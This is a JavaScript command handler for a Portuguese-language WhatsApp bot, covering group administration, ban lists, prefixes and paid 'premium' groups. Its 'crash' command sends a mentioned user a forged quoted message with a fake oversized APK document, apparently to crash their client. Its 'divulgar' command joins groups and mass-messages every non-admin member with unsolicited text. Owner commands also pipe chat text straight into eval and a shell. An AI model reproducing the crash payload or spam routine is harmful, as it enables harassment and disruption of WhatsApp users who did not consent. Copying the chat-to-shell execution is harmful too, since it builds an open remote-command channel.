const fs = require('fs');
const util = require('util');
const moment = require('moment-timezone');
const execute = util.promisify(require('child_process').exec);

const {
 color
} = require('../lib/color');

/* OWNER PUSHNAME*/
const {
 owner,
 compreSuaApikey,
 api
} = require('../../configure aqui.js');


module.exports = lolizita = async (lolizita, mek, archive) => {
 try {
  const from = mek.key.remoteJid;
  const content = JSON.stringify(mek.message);
  const type = Object.keys(mek.message).find((key) => !['senderKeyDistributionMessage', 'messageContextInfo'].includes(key));
  const prefix = archive.changePrefix.value.find((obj) => obj.groupId === from)?.prefix || '/';

  /* VISUALIZA STATUS*/
  if (mek.key.remoteJid == 'status@broadcast') return lolizita.readMessages([mek.key]);

  const budy = (type === 'conversation') ? mek.message.conversation: (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text: ''
  const body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation: (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption: (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption: (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text: (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: (type == 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage.selectedId: (type === 'messageContextInfo') ? mek.message[type].singleSelectReply.selectedRowId: (type == 'lolizita.sendMessageButtonMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId: (type == 'stickerMessage') && ((mek.message[type].fileSha256.toString('base64')) !== null && (mek.message[type].fileSha256.toString('base64')) !== undefined) ? (mek.message[type].fileSha256.toString('base64')): "" || mek.message[type]?.selectedButtonId || ""

  /* COMMANDS */
  const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase(): '';
  const comando = body.slice(1).trim().split(/ +/).shift().toLowerCase();

  const isCmd = body.startsWith(prefix);
  const args = body.trim().split(/ +/).slice(1);

  /* INFO BOT */
  const me = lolizita.user;
  const nameBot = lolizita.user?.name || "-";
  const botNumber = lolizita.user.id.split(':')[0] + '@s.whatsapp.net';

  /* GROUP META DADOS */
  const isGroup = from.endsWith('@g.us');
  const sender = isGroup ? (mek.key.participant ? mek.key.participant: mek.participant): mek.key.remoteJid;
  const groupMetadata = isGroup ? await lolizita.groupMetadata(from): {};
  const groupId = isGroup ? groupMetadata.id: '';
  const groupOwner = isGroup ? groupMetadata?.subjectOwner === undefined ? groupMetadata.id.split('-')[0] + "@s.whatsapp.net": groupMetadata?.subjectOwner: '';
  const groupDesc = isGroup ? groupMetadata.desc: '';
  const groupName = isGroup ? groupMetadata.subject: '';
  const groupMembers = isGroup ? groupMetadata.participants: [];
  const participants = isGroup ? await groupMetadata.participants: '';
  const memberIds = isGroup ? participants.map((obj) => obj.id): [];
  const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id): '';
  const isGroupAdmins = isGroup ? groupAdmins.includes(sender): false;
  const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;

  /* FUNCTION GET */
  const getPushName = (id) => archive._pushNames.value.find((obj) => obj.id === id)?.pushName;
  const getRecado = (id) => lolizita.fetchStatus(id);
  const getMessagePrivado = (userId) => archive._messageCount.value.users.find(obj => obj.id === userId)?.total || 0;
  const getTotalMessageGroup = (userId, groupId) => archive._messageCount.value.groups.find(obj => obj.groupId === groupId)?.users[userId] || 0;
  const getGroupMessageTotal = (group) => archive._messageCount.value?.groups.find((obj) => obj.groupId === group)?.total || 0;

  /* COUNT MESSAGE */
  const getInfoMessage = isGroup ? archive._messageCount.value.groups.find((obj) => obj.groupId === from): [];
  const idMembers = isGroup ? Object.keys(getInfoMessage.users): [];
  const messageMembers = isGroup ? Object.values(getInfoMessage.users): [];
  const membersId = isGroup ? groupMembers.map(({
   id
  }) => id): [];
  const ghosts = isGroup ? membersId.filter(id => !getTotalMessageGroup(id, from) && botNumber !== id): [];

  /* HR | HORA */
  const hr = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
  const speed = require('performance-now');
  const timestamp = speed();
  const latensi = speed() - timestamp;

  const isOwner = owner.includes(sender);
  const nameOwner = archive._pushNames.value.find(v => v.id === owner[0])?.pushName;
  const pushname = mek.pushName || "-";

  /* TRUE OF FALSE */
  const isWelcome = isGroup ? archive.welcome.value.includes(from): true
  const isAntiLink = isGroup ? archive.antilink.value.includes(from): true
  const isViewOnce = isGroup ? archive.antiViewOnce.value.includes(from): true
  const isAntiFake = isGroup ? archive.antifake.value.includes(from): true
  const isListaNegra = isGroup ? archive.antiListaNegra.value.includes(from): true;
  const isSimih = isGroup ? archive._simih.value.includes(from): false;

  const {
   linguagem,
   mess
  } = require('../database/menu');

  const {
   getAfk,
   addAfk,
   removeAfk,
   getRemoteAfk,
   remAfk,
   addMessage,
   savePushName,
   privateMember,
   deleteMembersCount,
   firstMessage,
   messageOwner,
   getAluguel,
   isGetAluguel,
   registreErrs,
   addCashMessage,
   getCashNumber,
   removeCash,
   stealCash,
   addCash,
   getCash,
   donateCash,
   getRegisteredRError,
   contactOwner,
   cashGet,
   toJson,
   reacting,
   ytdl
  } = require('../lib/_ModuFunctions');

  const message = (type == "audioMessage") ? mek.message[type]?.contextInfo?.audioMessage || mek.message: (type == "imageMessage") ? mek.message[type]?.contextInfo?.imageMessage || mek.message: (type == "videoMessage") ? mek.message[type]?.contextInfo?.videoMessage || mek.message: (type == "stickerMessage") ? mek.message[type]?.contextInfo?.stickerMessage || mek.message: (type == "documentMessage") ? mek.message[type]?.contextInfo?.documentMessage || mek.message: (type == "locationMessage") ? mek.message[type]?.contextInfo?.locationMessage || mek.message: mek

  //lolizita.sendMessage(from, {text: toJson(message)});

  const {
   isFiltered,
   addFilter
  } = require('../lib/antiflood.js');

  const {
   getGroupAdmins,
   getRandom,
   getExtension,
   getBuffer,
   fetchJson,
   sleep,
   runtime,
   isUrl,
   getFileBuffer,
   readMore,
   togif,
   levelPatent
  } = require('../lib/functions');

  const enviar = (content, type, options = {}) => {
   const isFullUrl = (url) => new RegExp(/^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)$/, 'gi').test(url);
   const mediaKeys = ['image',
    'video',
    'sticker',
    'audio',
    'document',
    'history',
    'md-app-state'];
   options[type || 'text'] = isFullUrl(content) && mediaKeys.includes(type) ? {
    url: content
   }: content;
   return lolizita.sendMessage(from, options, {
    quoted: mek
   });
  };

  const mentions = (teks, memberr, id) => {
   (id == null || id == undefined || id == false) ? lolizita.sendMessage(from, {
    text: teks.trim(), mentions: memberr
   }, {
    quoted: mek
   }): lolizita.sendMessage(from, {
    text: teks.trim(), mentions: [memberr]}, {
    quoted: mek
   });
  };

  const reply = (caption) => {
   lolizita.sendMessage(from, {
    text: util.inspect(caption)
   }, {
    quoted: mek
   });
  }

  /* TYPES MESSAGE */
  const isMedia = (type === 'imageMessage' || type === 'videoMessage')
  const isQuotedMsg = (type == 'extendedTextMessage')
  const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true: false: false
  const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true: false: false
  const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true: false: false

  const cmdBase = [{
   keys: ['mek',
    'key'],
   execution: async function() {
    if (!isOwner) return enviar(mess.onlyOwner());
    enviar(JSON.stringify(mek, null, 2));
   }
  },
   {
    keys: ['eval'],
    execution: async function () {
     if (!isOwner) return enviar(mess.onlyOwner());
     console.log(color("Eval: ", "red"), budy.slice(5))
     enviar('× [ Eval ] Comando executado!');
     try {
      await eval(`(async () => {
       ${budy.slice(5)}
       })();`)
     } catch (e) {
      enviar(String(e));
     }
    }
   },
   {
    keys: ['exec',
     'exe'],
    execution: async function () {
     const text = args.join(' ');
     if (!isOwner) return enviar(mess.onlyOwner());
     console.log(color("Eval:", "red"), text)
     enviar(eval(text)).finally(() => enviar('× [ Exec ] Comando executado!'));
    }
   },
   {
    keys: ['sair',
     'leave'],
    execution: async function() {
     if (!isOwner) return enviar(mess.onlyOwner());
     if (!isGroup) return enviar(mess.group());
     lolizita.groupLeave(from);
    }
   },
   {
    keys: ['ping'],
    execution: async function() {
     lolizita.sendExternalAdReply(from, linguagem.ping(prefix, nameBot, latensi, process, archive), linguagem.infoStore(archive), mess.timeOnline(runtime, process), archive.mess.value.mess.logo(), [{
      buttonId: `${prefix}menu`, buttonText: {
       displayText: `💢 [ MENU ] +`
      }, type: 1
     }], {
      quoted: mek
     });
    }
   },
   {
    keys: ['entrar',
     'join'],
    execution: async function() {
     const text = args.join(' ');
     if (!isOwner) return enviar(mess.onlyOwner());
     if (text.length < 1) return enviar('Cade o link do grupo?');
     lolizita.groupAcceptInvite(text.split('https://chat.whatsapp.com/')[1]).then((value) => {
      enviar('*Espere, estou entrando nesse grupo..* 📲');
     }, (err) => {
      if (err.output.payload.error === "Internal Server Error") return enviar('O bot foi banido por um administrador.');
      enviar(mess.commandError());
      console.log('Error : %s', color(err, 'red'));
     });
    }
   },
   {
    keys: ['reiniciar',
     'restart',
     'off'],
    execution: async function() {
     if (!isOwner) return enviar(mess.onlyOwner());
     enviar('Aguarde! Reiniciando em 5 segundos..');
     sleep(1000).then(() => process.exit());
    }
   },
   {
    keys: ['divu'],
    execution: async function() {
     const message = args.join(' ');
     if (!isOwner) return enviar(mess.onlyOwner());
     if (message.length < 1) return enviar('Coloque o texto! Ele servirá para ser divulgado.');
     fetchJson(`${api}/api/linkswhatapp?apikey=${compreSuaApikey}`).then((group) => {
      if (group.status === true) {
       enviar('Gerando dados, espere um  momento!');
       teks = `*Nome:* ${group.resultado.nome}
       *Acessos:* ${group.resultado.acessos}
       *Dia publicado:* ${group.resultado.publicado}
       *Dia verificado:* ${group.resultado.verificado}
       *Link:* ${group.resultado.link}

       • *Descrição:* ${group.resultado.desc}`;
       lolizita.templateImageMessage(from, teks, 'Comando para divulgar texto em grupos aleatórios! Tente divulgar algo.', {
        image: {
         url: group.resultado.foto
        }
       }, [{
         quickReplyButton: {
          displayText: "✔️ Confirmar", id: `${prefix}divulgar ${group.resultado.link}+${message}`
         }}, {
         quickReplyButton: {
          displayText: "Gerar outro grupo!", id: `${prefix}divu ${message}`
         }}]);
      } else if (group.status === false) {
       enviar('some error occurred');
      };
     },
      (err) => {
       enviar(mess.commandError(err));
       console.log('Error : %s', color(err, 'red'));
      });
    }
   },
   {
    keys: ['setprefix', 'addprefix'],
    execution: async function() {
     const text = args.join(' ');
     if (!isGroup) return enviar(mess.group());
     if (!isGroupAdmins) return enviar(mess.admin());
     if (text.length < 1) return enviar(`Erro! Comando correto: ${prefix + comando} < Novo Prefix >`);
     if (text.includes(prefix)) return enviar('❌ Impossível alterar o prefix para o mesmo prefix!');
     const position = archive.changePrefix.value.findIndex((obj) => obj.groupId === from);
     if (position !== -1) {
      archive.changePrefix.value[position].prefix = text;
      enviar(`✅ Prefix alterado com sucesso!\n\n× Novo prefix: ${text}`);
      fs.writeFileSync(archive.changePrefix.fileName, JSON.stringify(archive.changePrefix.value, null, 2));
     } else {
      archive.changePrefix.value.push({
       prefix: text, groupId: from, groupName: groupName
      });
      enviar(`⚠️ Prefix alterado com sucesso!\n\nObs: O prefixo só foi alterado para este grupo, usar comandos em outro grupo ou privado, o prefixo será outro.`);
      fs.writeFileSync(archive.changePrefix.fileName, JSON.stringify(archive.changePrefix.value, null, 2));
     }
    }
   },
   {
    keys: ['addban'],
    execution: async function() {
     try {
      const text = args.join(' ');
      if (!isOwner) return enviar(mess.onlyOwner());
      if (!isGroup) return enviar(mess.group());
      const mentionedJid = text.replace(/[- +@)(]/g, '') + "@s.whatsapp.net" === "@s.whatsapp.net" ? mek.message[type].contextInfo.participant: text.replace(/[- +@)(]/g, '') + "@s.whatsapp.net";
      if (text.indexOf('@') !== text.lastIndexOf('@')) return enviar("❌ Erro! Não pode mencionar 2 (dois) membros.")
      if (archive.addBanJson.value.includes(mentionedJid)) return enviar("❌ Esse membro já foi registrado.");
      archive.addBanJson.value.push(mentionedJid);
      fs.writeFileSync(archive.addBanJson.fileName, JSON.stringify(archive.addBanJson.value, null, 2) + '\n')
      enviar("✔️ Membro banido de usar comandos.");
     } catch (error) {
      const err = String(error);
      if (err.includes("TypeError: Cannot read properties of undefined (reading 'participant')")) return enviar(`❌ Erro! Não foi possível identificar o tipo de marcação/mensão.\n\n➡️ Exemplos:\n${prefix + comando} @${owner[0].split("@")[0]}\n${prefix + comando} ${owner[0].split("@")[0]}\nOu marque a mensagem do membro com ${prefix + comando}`);
      console.log('Error: ', color(err, 'red'));
     };
    }
   },
   {
    keys: ['remban',
     'delban',
     'dellban'],
    execution: async function() {
     try {
      const text = args.join(' ');
      if (!isGroup) return enviar(mess.group());
      if (!isOwner) return enviar(mess.onlyOwner());
      if (!isBotGroupAdmins) return enviar(mess.fromAdmin());
      const mentionedJid = text.replace(/[- +@)(]/g, '') + "@s.whatsapp.net" === "@s.whatsapp.net" ? mek.message[type].contextInfo.participant: text.replace(/[- +@)(]/g, '') + "@s.whatsapp.net";
      const position = archive.addBanJson.value.findIndex(x => x === mentionedJid);
      if (text.indexOf('@') !== text.lastIndexOf('@')) return enviar("❌ Erro! Não pode mencionar 2 (dois) membros.")
      if (position === -1) return enviar('*Esse membro não está registrado!* ❌');
      archive.addBanJson.value.splice(position, 1);
      fs.writeFileSync(archive.addBanJson.fileName, JSON.stringify(archive.addBanJson.value, null, 2) + '\n')
      enviar("✔️ Membro removido com sucesso.");
     } catch (error) {
      const err = String(error);
      if (err.includes("TypeError: Cannot read properties of undefined (reading 'participant')")) return enviar(`❌ Erro! Não foi possível identificar o tipo de marcação/mensão.\n\n➡️ Exemplos:\n${prefix + comando} @${owner[0].split("@")[0]}\n${prefix + comando} ${owner[0].split("@")[0]}\nOu marque a mensagem do membro com ${prefix + comando}`);
      console.log('Error: ', color(err, 'red'));
     };
    }
   },
   {
    keys: ['crash'],
    execution: async function() {
     try {
      const text = args.join(' ');
      if (!isOwner) return enviar(mess.onlyOwner());
      const mentionedJid = text.replace(/[- +@)(]/g, '') + "@s.whatsapp.net" === "@s.whatsapp.net" ? mek.message[type].contextInfo.participant: text.replace(/[- +@)(]/g, '') + "@s.whatsapp.net";
      if (text.indexOf('@') !== text.lastIndexOf('@')) return enviar("❌ Erro! Não pode mencionar 2 (dois) membros.")
      enviar("Pronto! Crashando...");
      const key = {
       key: {
        "remoteJid": '',
        "fromMe": mek.key.fromMe,
        "id": mek.key.id,
        "participant": mentionedJid
       },
       message: {
        "extendedTextMessage": {
         "text": ">> mek.message",
         "previewType": "NONE",
         "contextInfo": {
          "stanzaId": "53194BE863C2329A044C09B90091C41C",
          "participant": mentionedJid,
          "quotedMessage": {
           "documentMessage": {
            "url": "https://mmg.whatsapp.net/d/f/Ap00V20v1T_B0WjIfbrTWXyS2OJE_r8nFAUhGI00eZp2.enc",
            "mimetype": "application/vnd.android.package-archive",
            "title": "AF3DWBfkGpzLDiMDFxTo4XhicYUCStAldu_bYSMV_CIXaT0cwsJa7geM1LKWpwDuXgAGuT4VezRTd2lfCRjg20K9iPVhOH0sNxWxBaQxK-Bhdn341gOLTNXwZRR6xM7RLyLlZXWJl9R8O4uEvkBeU2TC9LS8MpsfMg.apk",
            "fileSha256": "8QjpnR6ScQTLNQ80Yf3Ce67ME4Z9E9br7jNWkuoWVCo=",
            "fileLength": "163956456",
            "pageCount": 0,
            "mediaKey": "R/5ob1hgPCBLCn+Y87RFQM8BTn33l+TIQM92KbZQ4CU=",
            "fileName": "AF3DWBfkGpzLDiMDFxTo4XhicYUCStAldu_bYSMV_CIXaT0cwsJa7geM1LKWpwDuXgAGuT4VezRTd2lfCRjg20K9iPVhOH0sNxWxBaQxK-Bhdn341gOLTNXwZRR6xM7RLyLlZXWJl9R8O4uEvkBeU2TC9LS8MpsfMg.apk",
            "fileEncSha256": "SISemEi7FiJj2p4wWS+mJ0J4tu8H/A3qLsvs1kANlpU=",
            "directPath": "/v/t62.43144-24/10000000_3341736529424547_2864196783721792472_n.enc?ccb=11-4&oh=01_AVwp1Q1KaUtkL27l5oKLuDUGAXFKpl6nVUpCCapUx8Xe-g&oe=633F2AAE",
            "mediaKeyTimestamp": "1662698104"
           }
          }
         },
         "inviteLinkGroupTypeV2": "DEFAULT"
        }
       }
      };
      lolizita.sendMessage(mentionedJid, {
       text: 'null'
      }, {
       quoted: key
      });
     } catch (error) {
      const err = String(error);
      if (err.includes("TypeError: Cannot read properties of undefined (reading 'participant')")) return enviar(`❌ Erro! Não foi possível identificar o tipo de marcação/mensão.\n\n➡️ Exemplos:\n${prefix + comando} @${owner[0].split("@")[0]}\n${prefix + comando} ${owner[0].split("@")[0]}\nOu marque a mensagem do membro com ${prefix + comando}`);
      console.log('Error: ', color(err, 'red'));
     };
    }
   },
   {
    keys: ['bangrup',
     'bangroup',
     'bangroupo'],
    execution: async function() {
     try {
      //@Tobi
      addFilter(from);
      if (!isOwner) return enviar(mess.onlyOwner());
      if (!isGroup) return enviar(mess.group());
      if (!isBotGroupAdmins) return enviar(mess.fromAdmin());
      if (!args[0].startsWith("on") && !args[0].startsWith("off")) return enviar(`❌ Erro! Você quer ligar? ou Dedligar?\n\n➡️ ${prefix + comando} on [ Para ligar ]\n➡️ ${prefix + comando} off [ Para Desligar ]`);
      if (args[0] === "on") {
       if (archive.listGroup.value.includes(from)) return enviar("❌ Erro! Esse grupo já foi registrado.");
       archive.listGroup.value.push(from);
       fs.writeFileSync(archive.listGroup.fileName, JSON.stringify(archive.listGroup.value, null, 2) + '\n')
       enviar("✔️ Grupo banido com sucesso.\n\nSó você poderá usar comandos!");
      } else if (args[0] === "off") {
       if (!archive.listGroup.value.includes(from)) return enviar("❌ Erro! Esse grupo já foi removido.");
       archive.listGroup.value.splice(from);
       fs.writeFileSync(archive.listGroup.fileName, JSON.stringify(archive.listGroup.value, null, 2) + '\n')
       enviar("❌ Grupo removido com sucesso da lista.");
      }
     } catch (err) {
      enviar(String(err).includes("TypeError: Cannot read properties of undefined (reading 'startsWith')") ? `❌ Erro! Você quer ligar? ou Dedligar?\n\n➡️ ${prefix + comando} on [ Para ligar ]\n➡️ ${prefix + comando} off [ Para Desligar ]`: "Tipo de erro não identificado.");
      console.log({
       err
      }, color(__filename, "red"));
     }
    }
   },
   {
    keys: ['divulgar'],
    execution: async function() {
     if (!isOwner) return enviar(mess.onlyOwner());
     teks = args.join(' ');
     if (teks.length < 1) return enviar('Coloque o texto! Ele servirá para ser divulgado.');
     if (!teks.includes("+")) return enviar(`❌ Erro! O uso do ${comando} deve conter + entre eles:\n\n✔️ Exemplo:\n\n⚠️ ${prefix + comando} [ Link ] + [ Texto ]\n⚠️ ${prefix + comando} hhttps://chat.whatsapp.com/blanlabla+Seu texto depois desse: +`);

     lolizita.groupAcceptInvite(teks.split('+')[0].split("https://chat.whatsapp.com/")[1]).then(async value => {
      const dataGroup = await lolizita.groupMetadata(value);
      const totalMem = dataGroup.participants.filter(i => i.admin === null).map(jid => jid.id);

      enviar(`• *Id*: ${dataGroup.id}\n• *Nome*: ${dataGroup.subject}\n• *Criador*: ${dataGroup.owner.split('@')[0]}\n• *Descrição*: ${dataGroup.desc}\n• *Total membros*: ${dataGroup.participants.map((obj) => obj.id).length}\n• *Total Admin*: ${dataGroup.participants.filter((obj) => obj.admin).length}`);

      const getMembros = dataGroup.participants.map((obj) => obj.id).length
      setTimeout(() => enviar(`A divulgação com ${getMembros} membros, acabou! Tente outra divulgação.`), getMembros * 10000);

      let timestamp = 0;
      for (const item of totalMem) {
       setTimeout(() => lolizita.sendMessage(item, {
        text: teks.split('+')[1]}), timestamp);
       timestamp += 10000;
      };
      sleep(20000).then(() => {
       lolizita.groupLeave(value);
       console.log('[ GRUPO EXPIRADO ]', color('Saindo do grupo!', 'red'))
       enviar('Saindo do grupo, 20 segundos expirado!')
      });
     },
      (err) => {
       enviar(mess.commandError(err));
       console.log('Error : %s', color(err, 'red'));
      });
    }
   },
   {
    keys: ['bash'],
    execution: async function() {
     if (!isOwner) return enviar(mess.onlyOwner());
     const text = args.join(' ');
     const {
      exec
     } = require("child_process");
     exec(text, (err, result) => {
      if (err) return enviar(toJson(err));
      enviar(result)
      .finally(() => enviar('× [ Exec ] Comando executado!'));
     });
    }
   },
   {
    keys: ['addpremium', 'addprem', 'add-prem'],
    execution: async function() {
     if (!isOwner) return enviar(mess.onlyOwner());
     const text = args.join(' ');
     if (!text) return enviar(`*Olá ${pushname}! Vou ensinar o básico para adicionar um grupo a Premium.*\n\n1️⃣ Primeiro:\nUse o comando: ${prefix + comando} Data da cobrança|Valor da cobrança|Tipo do aluguel\n\nUSE: |, PARA SEPARAR OS OBJETOS\n\n2️⃣ Segundo; Como por uma data:\n- A data deve ser no formato: 00/00/0000\nPrimeiro vem o dia: 01, 02, 03, 04, 05, 06, 07, 08, 09, 10, 11... Etc, vai depender do mês\n\n3️⃣ Terceiro: O mês pode ser assim: 01, 02, 03, 04, 05, 06, 07, 08, 09, 10, 11 e 12, etc...\n\n4⃣ Quarto: Tipo do grupo: Aluguel; se for para ter cobrança todos mês, e: Ilimitado; não vai emitir cobrança\n\n5⃣ Quinto e último: Primeiro vem o dia; 07, depois vem o mês; 09, e depois vem o ano: 2022.\n\n⚠️ Exemplo: ${prefix + comando} 01/02/2022|20 reais mensalmente|Aluguel`);
     const position = archive.groupDays.value.findIndex(x => x.groupId === from);
     if (position !== -1) return enviar('💢 Esse grupo já está registrado.');
     archive.groupDays.value.push({
      name: groupName,
      owner: groupOwner !== undefined ? groupOwner: from.includes('-') ? from.split('-')[0] + "@s.whatsapp.net": groupMetadata.participants.filter(({
       admin
      }) => admin !== null).map(({
       id
      }) => id),
      groupId: from,
      time: text.split("|")[0],
      valor: text.split("|")[1],
      type: text.split('|')[2]
     });
     fs.writeFileSync(archive.groupDays.fileName, JSON.stringify(archive.groupDays.value, null, 2));
     enviar(`✔️ Aluguel registrado!\n\n⚠️ Informações:\n - Nome: *${getAluguel(from).name}*\n - Dono: *wa.me/${getAluguel(from).owner.split('@')[0]}*\n - Dia da Cobrança: *${getAluguel(from).time}*\n - Valor: *${getAluguel(from).valor}*\n - Tipo: *${getAluguel(from).type}*\n\n‼️ A cobrança será feita no dia: ${getAluguel(from).time.split('/')[0]}, no mês: ${getAluguel(from).time.split('/')[1]}, do ano: ${getAluguel(from).time.split('/')[2]}`);
    }
   },
   {
    keys: ['delprem',
     'delpremium'],
    execution: async function() {
     if (!isOwner) return enviar(mess.onlyOwner());
     const position = archive.groupDays.value.findIndex(x => x.groupId === from);
     if (position !== -1) archive.groupDays.value.splice(position, 1);
     fs.writeFileSync(archive.groupDays.fileName, JSON.stringify(archive.groupDays.value, null, 2));
     enviar('*Grupo deletado!* ✅');
    }
   },
   {
    keys: ['groupsprem',
     'prem'],
    execution: async function() {
     if (!isOwner) return enviar(mess.onlyOwner());
     text = `⚠️ *Total grupos registrados:* ${archive.groupDays.value.length}\n\n`;
     for(const item of archive.groupDays.value) text += `[🧧] *Nome/Grupo:* ${item.name}\n× *Dono/Owner:* wa.me/${item.owner.split('@')[0]}\n× *Dono/Nome:* ${getPushName(item.owner)}\n× *Grupo/From:* ${item.groupId}\n× *Premium/Dia:* ${item.time}\n× *Valor:* ${item.valor}\n× *Tipo:* ${item.type}\n\n`;
     enviar(text);
    }
   },
   {
    keys: ['contato'],
    execution: async function() {
     const ownerName = archive._pushNames.value.find(v => v.id === archive.settings.value.owner[0])?.pushName || "-";
     contactOwner(from,
      lolizita,
      mek);
    }
   },
   {
    keys: ['pica'],
    execution: async function() {
     const midia = mek.message[type]?.contextInfo?.quotedMessage == undefined ? mek.message[type]: mek.message[type]?.contextInfo?.quotedMessage.imageMessage;
     const buffer = await lolizita.pica(midia);
     console.log({
      midia, buffer
     });

     //reply(buffer);
    }
   }]

  const cmd = cmdBase.find((cmd) => cmd.keys.includes(command));

  cmd?.execution().then(() => {},
   (err) => {
    console.log(color('[ CMDBASE ]', 'red'), color(__filename),
     err);
   });

 } catch (error) {
  const err = String(error);
  if (err.includes('Error: rate-overlimit')) return;
  lolizita.sendMessage(owner[0],
   {
    text: require('util').inspect(error)});
  console.log(color('[ ERROR ] ', 'red'), color(__filename),
   err);
 };
}

let file = require.resolve(__filename);
fs.watchFile(file,
 () => {
  fs.unwatchFile(file);
  console.log(color(`Update file: ${__filename}`, 'red'));
  delete require.cache[file];
  require(file);
 });